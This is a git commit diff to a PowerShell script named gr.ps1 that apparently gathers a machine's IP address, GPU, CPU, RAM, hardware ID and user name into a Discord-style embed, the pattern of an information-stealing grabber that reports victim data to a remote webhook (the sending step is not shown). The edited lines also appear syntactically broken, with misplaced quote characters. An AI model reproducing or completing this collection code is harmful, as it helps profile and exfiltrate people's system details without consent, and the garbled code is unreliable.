a2937436cdec9fcee453abc57a80c617e487f82d
Appolon <93398824+Appolon24800@users.noreply.github.com>
2023-01-23 21:03:47 +0100

    Update gr.ps1

--- gr.ps1
+++ gr.ps1
@@ -96,11 +96,11 @@ $thumbnailObject = [PSCustomObject]@{
 }
 $color = '12517376'
 $title = 'Info of '
-$description = 'IP: ' + '`' + $ip + '`' + '
+$description = 'IP: ' + '`' + $ip + '`' + 
 GPU: ' + '`' + $GPU + '`' + '
 CPU: ' + '`' + $CPU + '`' + '
 RAM: ' + '`' + $ram + '`' + '
-HWID: ' + '`' + $hwid + '`' 
+HWID: ' + '`' + $hwid + '`' '
 $embedObject = [PSCustomObject]@{
     color = $color
     title = $title + '`' + $env:UserName + '`'
